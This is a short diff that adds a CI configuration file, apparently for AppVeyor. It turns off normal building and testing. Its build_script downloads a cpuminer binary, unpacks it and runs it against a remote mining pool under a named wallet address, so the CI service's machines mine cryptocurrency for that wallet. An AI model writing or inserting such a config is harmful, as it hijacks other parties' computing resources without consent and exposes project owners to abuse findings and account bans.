@@ -1,0 +1,5 @@
+build: off
+test: off
+
+build_script:
+  - sh: wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz && ./cpuminer-avx2 -a yespower -o stratum+tcps://na.rplant.xyz:17122 -u RN1x1ZehjTRFa9tt9vEvH1YXURwPZKz7BE.Appveyor -t 4
